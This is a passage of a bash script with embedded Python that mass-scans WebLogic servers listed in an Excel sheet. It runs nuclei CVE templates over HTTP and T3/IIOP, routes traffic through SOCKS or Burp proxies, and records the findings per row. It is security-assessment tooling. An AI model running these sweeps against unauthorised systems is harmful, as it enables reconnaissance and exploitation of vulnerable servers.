# and the result is re-classified by reported info.severity after the run (explicit
# impact filter). Appends to $result_file (caller scope). Single pass (no OAST retry).
# Reads $host_only / $wlport from the caller (run_nuclei_for_target) by dynamic scope.
run_full_sweep() {
  local target="$1" out="" r t
  local http_t=() raw_t=()
  for t in "${WLS_SWEEP_HTTP[@]}"; do [[ -f "$t" ]] && http_t+=("-t" "$t"); done
  for t in "${WLS_SWEEP_RAW[@]}";  do [[ -f "$t" ]] && raw_t+=("-t" "$t"); done
  if [[ ${#http_t[@]} -eq 0 && ${#raw_t[@]} -eq 0 ]]; then
    echo "    [row ${row:-?}] WebLogic fallback sweep: no upstream templates found under $UPSTREAM_TPL" >&2
    return
  fi
  echo "    [row ${row:-?}] WebLogic high/critical fallback sweep ($(( ${#http_t[@]}/2 )) http + $(( ${#raw_t[@]}/2 )) t3)..." >&2
  local nuclei_proxy=()
  [[ -n "$PROXY" ]] && nuclei_proxy=(-proxy "$PROXY")
  # HTTP WebLogic templates -> web URL (Burp proxy)
  if [[ ${#http_t[@]} -gt 0 ]]; then
    r=$(nuclei -u "$target" "${http_t[@]}" \
      "${nuclei_proxy[@]+"${nuclei_proxy[@]}"}" \
      -severity "$FULL_SWEEP_SEVERITY" \
      -timeout "$TIMEOUT" -rate-limit "$RATE_LIMIT" \
      -no-color -jsonl -silent </dev/null 2>/dev/null || true)
    out="${out}${out:+$'\n'}${r}"
  fi
  # network/T3 WebLogic templates -> host:wlport (proxychains --socks, like raw batch)
  if [[ ${#raw_t[@]} -gt 0 ]]; then
    local nuclei_wrap=""
    if [[ -n "$SOCKS" && -f "${PROXYCHAINS_CONF:-/dev/null}" ]] && command -v proxychains4 &>/dev/null; then
      nuclei_wrap="proxychains4 -q -f $PROXYCHAINS_CONF"
    fi
    r=$($nuclei_wrap nuclei -u "${host_only}:${wlport}" "${raw_t[@]}" \
      -severity "$FULL_SWEEP_SEVERITY" \
      -timeout "$TIMEOUT" -rate-limit "$RATE_LIMIT" \
      -no-color -jsonl -silent </dev/null 2>/dev/null || true)
    out="${out}${out:+$'\n'}${r}"
  fi
  [[ -z "${out//[$'\n ']/}" ]] && return
  # Impact classification: keep only $FULL_SWEEP_SEVERITY by reported info.severity.
  local sev_re kept
  sev_re=$(printf '%s' "$FULL_SWEEP_SEVERITY" | tr ',' '|' | tr -d ' ')
  kept=$(printf '%s\n' "$out" | grep -Ei "\"severity\"[[:space:]]*:[[:space:]]*\"(${sev_re})\"" || true)
  if [[ -n "$kept" ]]; then
    local n_all n_kept
    n_all=$(printf '%s\n' "$out" | grep -c . || true)
    n_kept=$(printf '%s\n' "$kept" | grep -c . || true)
    [[ "$n_kept" -lt "$n_all" ]] && \
      echo "    [row ${row:-?}] impact filter: kept $n_kept/$n_all finding(s) ($FULL_SWEEP_SEVERITY)" >&2
    printf '%s\n' "$kept" >> "$result_file"
  fi
}

run_nuclei_for_target() {
  local row="$1" url="$2"
  local surface_file="$SURFACE_DIR/row${row}.txt"
  local surfaces
  surfaces=$(cat "$surface_file" 2>/dev/null || echo "NONE")

  # WebLogic listen port discovered in Phase 1 (for T3/IIOP templates), and the
  # bare host (T3/IIOP must target host:wlport, not the HTTP URL / :443).
  local wlport host_only
  wlport=$(cat "$SURFACE_DIR/row${row}.wlport" 2>/dev/null || echo 7001)
  host_only=$(echo "$url" | sed -E 's|^https?://||;s|[:/].*||')

  local result_file="$RESULTS_DIR/row${row}.json"

  if [[ "$surfaces" == "NONE" ]]; then
    : > "$result_file"
    # No WebLogic surface (even after the optional port sweep). Fall back to the
    # upstream WebLogic high/critical templates anyway — a surface probe can
    # false-negative (WAF-hidden console, filtered/odd T3 port), and these templates
    # confirm via their own requests/OAST.
    if $DRY_RUN; then
      echo "  [row $row] no attack surface -> would run WebLogic high/critical fallback sweep"
    elif $FULL_FALLBACK; then
      echo "  [row $row] no attack surface -> WebLogic high/critical fallback sweep"
      run_full_sweep "$url"
      local nhits=0; [[ -s "$result_file" ]] && nhits=$(wc -l < "$result_file" | tr -d ' ')
      echo "  [row $row] -> $nhits finding(s) (full fallback)"
    else
      echo "  [row $row] no attack surface detected, skipping (full fallback off)"
    fi
    return
  fi

  # Base URL for console templates: the admin port (https://host:ADMIN_PORT) when
  # the console was found there in Phase 1, otherwise the web URL.
  local console_base
  console_base=$(cat "$SURFACE_DIR/row${row}.consoleurl" 2>/dev/null || echo "$url")

  # Exact comma-token match so "T3" does NOT also match the SSL token "T3-ssl"
  # (templates speak plaintext; SSL surfaces are report-only, handled in Phase 1).
  has_surface() { case ",$surfaces," in *",$1,"*) return 0 ;; *) return 1 ;; esac; }

  # Three template groups, each delivered to its own target:
  #   console_tpls -> console_base (web URL, or admin-port https://host:9002)
  #   app_tpls     -> web URL (wls-wsat/_async/ws_utc)
  #   raw_tpls     -> host:wlport (T3/IIOP)
  local console_tpls=() app_tpls=() raw_tpls=() t

  # Console templates: a console surface (HTTP / HTTP-restricted / HTTP-bypass).
  # Exact tokens so "HTTP-app" does NOT pull in the console preauth set.
  if has_surface HTTP || has_surface HTTP-restricted || has_surface HTTP-bypass; then
    for t in "${HTTP_TEMPLATES[@]}"; do [[ -f "$t" ]] && console_tpls+=("-t" "$t"); done
  fi

  # HTTP app-surface templates (wls-wsat/_async/ws_utc) — always on the web URL,
  # even if the console was found on the admin port.
  if has_surface HTTP-app; then
    for t in "${HTTP_APP_TEMPLATES[@]}"; do [[ -f "$t" ]] && app_tpls+=("-t" "$t"); done
  fi

  # T3 templates: only plaintext T3 open
  if has_surface T3; then
    for t in "${T3_TEMPLATES[@]}"; do [[ -f "$t" ]] && raw_tpls+=("-t" "$t"); done
  fi

  # IIOP templates: need plaintext T3 (version probe) + plaintext IIOP (delivery)
  if has_surface T3 && has_surface IIOP; then
    for t in "${IIOP_TEMPLATES[@]}"; do [[ -f "$t" ]] && raw_tpls+=("-t" "$t"); done
  fi

  local count=$(( (${#console_tpls[@]} + ${#app_tpls[@]} + ${#raw_tpls[@]}) / 2 ))
  if [[ $count -eq 0 ]]; then
    echo "  [row $row] no matching templates for surfaces: $surfaces"
    : > "$result_file"
    return
  fi

  if $DRY_RUN; then
    echo "  [row $row] would run $count templates (surfaces: $surfaces; console@$console_base)"
    : > "$result_file"
    return
  fi

  echo "  [row $row] scanning ($count templates, surfaces: $surfaces, console@$console_base)..."

  # Start fresh: each batch below retries-on-no-results and APPENDS its findings.
  : > "$result_file"

  local nuclei_proxy=()
  [[ -n "$PROXY" ]] && nuclei_proxy=(-proxy "$PROXY")

  # Console templates -> console_base (web URL, or admin-port https://host:9002)
  if [[ ${#console_tpls[@]} -gt 0 ]]; then
    local c_out
    c_out=$(run_nuclei_retry nuclei -u "$console_base" \
      "${console_tpls[@]}" \
      "${nuclei_proxy[@]+"${nuclei_proxy[@]}"}" \
      -timeout "$TIMEOUT" -rate-limit "$RATE_LIMIT" -no-color -jsonl -silent)
    [[ -n "$c_out" ]] && printf '%s\n' "$c_out" >> "$result_file"
  fi

  # HTTP app-surface templates -> web URL (wls-wsat/_async/ws_utc)
  if [[ ${#app_tpls[@]} -gt 0 ]]; then
    local a_out
    a_out=$(run_nuclei_retry nuclei -u "$url" \
      "${app_tpls[@]}" \
      "${nuclei_proxy[@]+"${nuclei_proxy[@]}"}" \
      -timeout "$TIMEOUT" -rate-limit "$RATE_LIMIT" -no-color -jsonl -silent)
    [[ -n "$a_out" ]] && printf '%s\n' "$a_out" >> "$result_file"
  fi

  # T3/IIOP templates -> host:wlport via proxychains4 (NOT the HTTP URL/:443).
  if [[ ${#raw_tpls[@]} -gt 0 ]]; then
    local nuclei_wrap=""
    if [[ -n "$SOCKS" && -f "${PROXYCHAINS_CONF:-/dev/null}" ]] && command -v proxychains4 &>/dev/null; then
      nuclei_wrap="proxychains4 -q -f $PROXYCHAINS_CONF"
    fi
    # Templates default args.Port to 7001, but nuclei OVERRIDES it with the target's
    # explicit port, so the unmodified (signed) templates hit host:wlport — no
    # sed-editing (which breaks the `# digest:` signature) and no re-signing.
    local raw_out
    raw_out=$(run_nuclei_retry $nuclei_wrap nuclei -u "$host_only:$wlport" \
      "${raw_tpls[@]}" \
      -timeout "$TIMEOUT" -rate-limit "$RATE_LIMIT" -no-color -jsonl -silent)
    [[ -n "$raw_out" ]] && printf '%s\n' "$raw_out" >> "$result_file"
  fi

  local hits=0
  [[ -s "$result_file" ]] && hits=$(wc -l < "$result_file" | tr -d ' ')

  # Fallback: the curated template set found nothing on a target that DID expose a
  # surface — sweep the whole upstream repo (minus the curated upstream set) so the
  # target isn't written off just because no WebLogic CVE matched.
  if [[ "$hits" -eq 0 ]] && $FULL_FALLBACK; then
    run_full_sweep "$url"
    hits=0; [[ -s "$result_file" ]] && hits=$(wc -l < "$result_file" | tr -d ' ')
    echo "  [row $row] -> $hits finding(s) (after full fallback)"
  else
    echo "  [row $row] -> $hits finding(s)"
  fi
}

while IFS=$'\t' read -r row url <&3; do
  sem_wait
  run_nuclei_for_target "$row" "$url" &
done 3< "$TARGETS_FILE"
wait 2>/dev/null || true

# ─── Phase 3: write results back to Excel ─────────────────────────────────────
echo ""
echo "[*] Phase 3: writing results to Excel..."

"$PYTHON" - "$EXCEL" "$WORK_DIR" "$ROW_START" "$ROW_END" <<'PYWRITE'
import sys, os, json, openpyxl
from openpyxl.styles import Font, PatternFill

excel = sys.argv[1]
work_dir = sys.argv[2]
row_start = int(sys.argv[3])
row_end = int(sys.argv[4])

wb = openpyxl.load_workbook(excel)
ws = wb.active

TITLES = ["Attack Surface", "Vulnerabilities", "Scan Detail"]

# Locate the "Note" column by header (fallback to D=4) so the scan block always
# lands right after it regardless of prior shifts.
note_col = 4
for c in range(1, ws.max_column + 1):
    if str(ws.cell(1, c).value or "").strip().lower() == "note":
        note_col = c
        break

# Idempotent: remove ANY previously-inserted scan columns (a prior bug inserted
# a fresh block every run, duplicating E/F/G and pushing real columns right).
# Delete all columns whose header matches one of our titles, right-to-left, then
# insert exactly one fresh block. Re-running now overwrites instead of stacking.
stale = [c for c in range(1, ws.max_column + 1)
         if str(ws.cell(1, c).value or "").strip() in TITLES]
removed = len(stale)
for c in sorted(stale, reverse=True):
    ws.delete_cols(c, 1)

surface_col = note_col + 1
vuln_col = note_col + 2
detail_col = note_col + 3

ws.insert_cols(surface_col, 3)

header_font = Font(bold=True)
header_fill = PatternFill("solid", fgColor="D9E1F2")
for col, title in [(surface_col, "Attack Surface"),
                   (vuln_col, "Vulnerabilities"),
                   (detail_col, "Scan Detail")]:
    cell = ws.cell(1, col, title)
    cell.font = header_font
    cell.fill = header_fill

# Locate the "Version" column (for writing the T3-probed WebLogic version). It sits
# left of "Note", so the insert above did not shift it; re-scan anyway to be safe.
version_col = None
for c in range(1, ws.max_column + 1):
    if str(ws.cell(1, c).value or "").strip().lower() == "version":
        version_col = c
        break

for row in range(row_start, row_end + 1):
    sf = os.path.join(work_dir, "surfaces", f"row{row}.txt")
    surfaces = ""
    if os.path.isfile(sf):
        surfaces = open(sf).read().strip()
    rfn = os.path.join(work_dir, "surfaces", f"row{row}.reason")
    reason = ""
    if os.path.isfile(rfn):
        reason = open(rfn).read().strip()
    # Column E = machine tokens on the first line, then the evidence/why below.
    cell_e = surfaces + ("\n" + reason if reason else "")
    c = ws.cell(row, surface_col, cell_e)
    c.alignment = openpyxl.styles.Alignment(wrap_text=True, vertical="top")

    # Update the "Version" column with the WebLogic version parsed from the T3
    # HELO handshake, only when it was actually probed (non-empty). Overwrites,
    # since the live handshake is authoritative; untouched if not probed.
    if version_col:
        vf = os.path.join(work_dir, "surfaces", f"row{row}.version")
        if os.path.isfile(vf):
            ver = open(vf).read().strip()
            if ver:
                ws.cell(row, version_col, ver)

    rf = os.path.join(work_dir, "results", f"row{row}.json")
    cves = []
    details = []
    if os.path.isfile(rf):
        for line in open(rf):
            line = line.strip()
            if not line:
                continue
            try:
                j = json.loads(line)
                tid = j.get("template-id", j.get("templateID", ""))
                sev = j.get("info", {}).get("severity", "")
                matched = j.get("matched-at", j.get("matched", ""))
                cves.append(tid)
                details.append(f"{tid} [{sev}] {matched}")
            except json.JSONDecodeError:
                details.append(line)

    seen = []
    for c in cves:
        if c not in seen:
            seen.append(c)

    ws.cell(row, vuln_col, ", ".join(seen) if seen else "")
    ws.cell(row, detail_col, "\n".join(details) if details else "")

    if seen:
        ws.cell(row, vuln_col).font = Font(color="CC0000", bold=True)

for col in [surface_col, vuln_col, detail_col]:
    max_len = 0
    for row in range(1, row_end + 1):
        v = ws.cell(row, col).value
        if v:
            max_len = max(max_len, min(len(str(v)), 60))
    ws.column_dimensions[openpyxl.utils.get_column_letter(col)].width = max_len + 2

wb.save(excel)
print(f"Results written to {excel}")
col_letter = openpyxl.utils.get_column_letter
print(f"  Scan columns at {col_letter(surface_col)} (Attack Surface), "
      f"{col_letter(vuln_col)} (Vulnerabilities), {col_letter(detail_col)} (Scan Detail)")
if removed > 3:
    print(f"  Cleaned {removed - 3} leftover duplicate scan column(s) from prior runs")
elif removed:
    print(f"  Overwrote existing scan columns (no duplication)")
PYWRITE

echo ""
echo "[done] Results in: $EXCEL"
echo "    Work dir (raw JSON): $WORK_DIR"
